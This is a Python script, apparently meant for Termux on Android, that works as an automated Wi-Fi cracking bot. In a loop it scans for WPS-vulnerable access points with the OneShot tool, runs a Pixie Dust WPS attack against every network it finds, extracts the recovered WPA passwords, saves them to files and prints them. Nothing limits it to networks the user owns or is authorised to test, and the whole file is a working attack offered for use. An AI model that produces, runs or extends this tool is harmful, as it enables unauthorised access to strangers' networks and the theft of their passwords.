#!/usr/bin/env python3
"""
pwnagotchi-like Termux app (text-based) with SSID display
- Uses `sudo oneshot -i wlan0` to discover networks
- Parses vulnerable (green) networks by BSSID & SSID
- Cracks WPS with `sudo oneshot -i wlan0 -b <BSSID> -K`
- Logs each cycle, displays SSID when attacking
"""
import os
import sys
import subprocess
import time
import re
from datetime import datetime

# Configuration
INTERFACE = os.environ.get('WIFI_INTERFACE', 'wlan0')
CRACKED_DIR = os.path.expanduser('~/cracked')
SCAN_INTERVAL = 5          # seconds between cycles
SCAN_TIMEOUT = 20          # seconds for scan command
ATTACK_TIMEOUT = 10        # seconds per BSSID attack
ONESHOT_CMD = 'oneshot'
CLEAR_CMD = 'clear'

os.makedirs(CRACKED_DIR, exist_ok=True)

# Run oneshot scan to list networks, extract vulnerable ones
# Returns list of dicts: {'bssid': ..., 'ssid': ...}
def get_vulnerable_networks():
    try:
        proc = subprocess.run(
            ['sudo', ONESHOT_CMD, '-i', INTERFACE],
            capture_output=True, text=True, timeout=SCAN_TIMEOUT
        )
        output = proc.stdout
    except subprocess.TimeoutExpired:
        return []
    except Exception:
        return []

    vulns = []
    for line in output.splitlines():
        # lines with green color code or '[+]' marker
        if '\x1b[32m' in line or '[+]' in line:
            # Example line: '[+] 00:11:22:33:44:55 MyWiFi ...'
            parts = line.split()
            # find BSSID
            bssid_match = re.search(r'([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}', line)
            if bssid_match and len(parts) >= 3:
                bssid = bssid_match.group(0)
                ssid = parts[2]
                vulns.append({'bssid': bssid, 'ssid': ssid})
    # remove duplicates by BSSID
    seen = set()
    unique = []
    for net in vulns:
        if net['bssid'] not in seen:
            seen.add(net['bssid'])
            unique.append(net)
    return unique

# Attack a single BSSID
def attack_network(bssid):
    try:
        proc = subprocess.run(
            ['sudo', ONESHOT_CMD, '-i', INTERFACE, '-b', bssid, '-K'],
            capture_output=True, text=True, timeout=ATTACK_TIMEOUT
        )
        return proc.stdout + proc.stderr
    except subprocess.TimeoutExpired:
        return ''
    except Exception:
        return ''

# Parse PSKs from output
def parse_psks(output):
    return re.findall(r'PSK:\s*(\S+)', output)

# Save cracked credentials
def save_crack(bssid, psk):
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    fname = f"{ts}_{bssid.replace(':','')}.txt"
    with open(os.path.join(CRACKED_DIR, fname), 'w') as f:
        f.write(f"BSSID: {bssid}\nPSK: {psk}\n")

# Main loop
def main():
    if os.geteuid() != 0:
        print("[!] Please run as root (tsu)")
        sys.exit(1)

    cycle = 0
    total_scanned = 0
    total_cracked = 0

    print(f"[+] Starting Pwnagotchi-Termux on {INTERFACE} (scan every {SCAN_INTERVAL}s)")
    print(f"[+] Cracked outputs will be saved to {CRACKED_DIR}\n")

    while True:
        cycle += 1
        start = time.time()
        ts = datetime.now().strftime('%H:%M:%S')

        # Discover vulnerable networks
        nets = get_vulnerable_networks()
        scanned_now = len(nets)
        total_scanned += scanned_now

        cracked_now = 0
        # Attack each
        for net in nets:
            bssid = net['bssid']
            ssid = net['ssid']
            print(f"[{ts}] Attacking {ssid} ({bssid})...")
            out = attack_network(bssid)
            psks = parse_psks(out)
            if psks:
                for psk in psks:
                    cracked_now += 1
                    save_crack(bssid, psk)
                    print(f"[+] Cracked {ssid}! PSK: {psk}")

        total_cracked += cracked_now
        duration = time.time() - start

        # Clear and log summary
        os.system(CLEAR_CMD)
        print(f"[{ts}] Cycle {cycle} completed in {duration:.1f}s")
        print(f"  Scanned: {scanned_now} vulnerable networks | Total scanned: {total_scanned}")
        print(f"  Cracked: {cracked_now} this cycle | Total cracked: {total_cracked}\n")

        time.sleep(SCAN_INTERVAL)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Exiting...")
